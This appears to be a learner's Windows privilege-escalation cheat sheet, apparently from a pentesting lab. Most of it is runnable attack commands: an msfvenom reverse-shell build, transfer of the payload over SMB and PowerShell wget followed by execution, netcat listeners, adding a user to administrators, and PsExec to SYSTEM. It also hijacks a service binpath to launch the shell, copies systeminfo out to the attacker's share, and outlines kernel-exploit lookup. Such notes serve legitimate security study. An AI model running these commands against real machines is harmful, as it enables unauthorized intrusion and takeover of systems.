# Windows Privilege Escalation

## Reverse Shell

### Creating a Reverse Shell Executable (.exe)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f exe -o reverse.exe
```
### Transfering Shell
- Through SMB
kali terminal 1
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
kali terminal 2
```bash
sudo nc -nvlp 8133
```
windows
```
copy \\10.13.47.80\kali\reverse.exe C:\PrivEsc\reverse.exe

C:\PrivEsc\reverse.exe
```

- Through Powershell wget
kali terminal 1
```bash
python -m SimpleHTTPServer 4444
```
kali terminal 2
```
sudo nc -nvlp 8133
```
windows
```
powershell -c wget "http://10.13.47.80:4444/reverse.exe" -outfile "C:\PrivEsc\reverse.exe"

C:\PrivEsc\reverse.exe
```

### Administrator Shell Through RDP
windows
```
net localgroup administrators <username> /add
```

### Local Admin to SYSTEM
Use PsExec64.exe
```
./PsExec64.exe -accepteula -i -s C:/PrivEsc/reverse.exe
```

## Enumeration Tools
- PowerUp.ps1
```bash
powershell -exec bypass

. .\PowerUp.ps1
Invoke-AllChecks
```

- SharpUp.exe
```
.\SharpUp.exe
```
- Seatbelt (alot outputs, does not search for privesc vectors for you)
```
.\Seatbelt.exe all
```
- WINpeas.exe (most powerful)
allow colors (Alternatively, reverse shell from kali should show colour as well)
```
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```
open new cmd
```
.\winPEAS.exe
```
## Service Exploit
- Note that you need to have permission to start and stop service for this to work
### Important Services Commands
- Query configurations of service
```
sc qc <svc name>
```
- Query current status of service
```
sc query <svc name>
```
- Modify an option in the servce
```
sc config <svc name> <option>= <value>
# note that it is <option>=<space><value>
```
- Start/stop a service
```
sc start/stop <svc name>
```
## 5 Types of Misconfigurations
1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permission
4. Insecure Service Executables
5. DLL Hijacking

## Insecure Service Properties
1. Check winpeas under ```interesting services - non microsoft``` and see if there is any one of it states that ```you can modify this service```
2. You can verify it again in winpeas under ```modifiable services``` section
3. You can further verify it with ```accesschk.exe``` and see if you have ```SERVICE_CHANGE_CONFIG``` with this command
```
.\accesschk.exe /accepteula -uwcqv <PC username> <svc name> 
```
4. See where does the binary path point to with ```sc qc <svc name>```
5. see if you need to start/stop the service ```sc query <svc name>```
6. change binary path to location of our reverse shell
```
sc config <svc name> binpath= "\"C:\Privesc\reverse.exe\""
```
7. setup ```nc``` and start the service with ```net start <svc name>```

## Kernel Exploit (Last resort)
### Tools
1. Windows Exploit Suggester (wes)
2. Precompiled Kernel Exploits
3. Watson (For more recent Windows version)
### Technique
- See if ```systeminfo``` results show older unpatched windows and find relevant exploit for it.

1. Run ```systeminfo > \\10.13.47.80\kali\systeminfo.txt``` on the windows terminal to transfer systeminfo to kali SMB.
2. Run this in kali terminal
```
python wes.py /kali/systeminfo.txt -i 'Elevation of Privilege' --exploit-only | more
```
3. Cross reference all the CVE results with the Precompiled Kernel Exploits list.
4. If cant find, go search in exploit-db

